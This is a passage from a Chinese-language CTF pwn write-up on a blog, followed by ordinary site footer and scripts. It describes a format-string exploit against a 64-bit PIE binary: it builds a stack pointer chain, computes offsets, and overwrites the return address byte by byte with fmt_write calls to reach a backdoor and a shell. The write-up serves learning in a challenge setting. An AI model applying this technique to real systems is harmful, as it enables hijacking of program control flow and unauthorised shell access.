+<p>此外，我们注意到，<code>c</code>中的偏移在开了<code>PIE</code>之后是不固定的，因此我们可以通过先泄露<code>b</code>的地址，然后泄露<code>c</code>的地址，在本题中<code>b</code>的偏移是固定的，可以用<code>c的地址</code>减去<code>b的地址</code>然后<code>除以8</code>。</p>
+<blockquote>
+<p>64位系统中，fmt按照8计算偏移，而32位按照4，这是栈地址的位数决定的。</p>
+</blockquote>
+<p>然后我们现在的情况是<code>a-&gt;b-&gt;c-&gt;d</code>,然后<code>d</code>是返回地址的栈地址，指向这我们真正的返回地址<code>e</code>。 也就是<code>0x7ffe43be6d28 —▸ 0x7ffe43be6e18 —▸ 0x7ffe43be8228 —▸ 0x7ffe43be6d08-&gt;0x75be6e029d90 (__libc_start_call_main+128)</code></p>
+<p>我们可以如法炮制再打一遍，在<code>a-&gt;b-&gt;c-&gt;d-&gt;e</code>中，我们传入<code>b</code>的偏移来修改<code>d</code>的低字节，然后传入<code>c</code>的偏移来修改<code>e</code>，也就是我们的返回地址，每次通过<code>b</code>将<code>d</code>的地址+1，来逐步将<code>e</code>修改为后门地址。</p>
+<p>也就是我们第一次调用<code>c = fmt_write(a,b,ret_addr) </code>,然后第二次调用<code>fmt_write(b,c,backdoor_addr)</code>,最后按照题目意思交互拿到<code>shell</code>解决问题即可。</p>
+
+
+                
+
+                
+                <hr>
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/HitDocker/" data-toggle="tooltip" data-placement="top" title="Docker与HIT·服务计算实验">&larr;
+                            Previous Post</a>
+                    </li>
+                    
+                    
+                </ul>
+                
+
+                
+
+
+            </div>
+
+            
+            
+            <div class="
+                col-lg-2 col-lg-offset-0
+                visible-lg-block
+                sidebar-container
+                catalog-container">
+                <div class="side-catalog">
+                    <hr class="hidden-sm hidden-xs">
+                    <h5>
+                        <a class="catalog-toggle" href="#">CATALOG</a>
+                    </h5>
+                    <ul class="catalog-body"></ul>
+                </div>
+            </div>
+            
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                
+                
+                <section>
+                    <hr class="hidden-sm hidden-xs">
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/course" title="course">
+                            course
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/crypto" title="crypto">
+                            crypto
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/ctf" title="ctf">
+                            ctf
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/notebook" title="notebook">
+                            notebook
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/pwn" title="pwn">
+                            pwn
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/writeup" title="writeup">
+                            writeup
+                        </a>
+                        
+                        
+                    </div>
+                </section>
+                
+
+                
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">                  
+                    
+                    <li>
+                        <a href="mailto:empire258700@gmail.com">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		           
+                    
+                    
+                    
+                    
+
+		            
+                    
+                    
+                    <li>
+                        <a target="_blank" href="https://github.com/ZephyrVictor">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		            
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+            
+            
+            
+           
+                   <li>
+                       <a href='' rel="alternate" type="application/rss+xml" title="#3" >
+                           <span class="fa-stack fa-lg">
+                               <i class="fas fa-circle fa-stack-2x"></i>
+                               <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                           </span>
+                       </a>
+                   </li>
+            
+             </ul>
+		<p class="copyright text-muted">
+                    Copyright &copy; #3 2024
+                    
+                    <br>
+                    <a href="https://themes.gohugo.io/hugo-theme-cleanwhite">CleanWhite Hugo Theme</a> by <a href="https://zhaohuabing.com">Huabing</a> |
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=zhaohuabing&repo=hugo-theme-cleanwhite&type=star&count=true" >
+                    </iframe>
+                    
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+
+
+<script>
+    function loadAsync(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+
+
+
+
+<script>
+    
+    if($('#tag_cloud').length !== 0){
+        loadAsync("/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+
+<script>
+    loadAsync("https://cdn.jsdelivr.net/npm/fastclick@1.0.6/lib/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+
+
+
+<script type="text/javascript">
+    function generateCatalog(selector) {
+
+        
+        
+        
+        
+            _containerSelector = 'div.post-container'
+        
+
+        
+        var P = $(_containerSelector), a, n, t, l, i, c;
+        a = P.find('h1,h2,h3,h4,h5,h6');
+
+        
+        $(selector).html('')
+
+        
+        a.each(function () {
+            n = $(this).prop('tagName').toLowerCase();
+            i = "#" + $(this).prop('id');
+            t = $(this).text();
+            c = $('<a href="' + i + '" rel="nofollow">' + t + '</a>');
+            l = $('<li class="' + n + '_nav"></li>').append(c);
+            $(selector).append(l);
+        });
+        return true;
+    }
+
+    generateCatalog(".catalog-body");
+
+    
+    $(".catalog-toggle").click((function (e) {
+        e.preventDefault();
+        $('.side-catalog').toggleClass("fold")
+    }))
+
+    
+
+
+    loadAsync("\/js\/jquery.nav.js", function () {
+        $('.catalog-body').onePageNav({
+            currentClass: "active",
+            changeHash: !1,
+            easing: "swing",
+            filter: "",
+            scrollSpeed: 700,
+            scrollOffset: 0,
+            scrollThreshold: .2,
+            begin: null,
+            end: null,
+            scrollChange: null,
+            padding: 80
+        });
+    });
+</script>
+
+
+
+
+
+
+</body>
+</html>
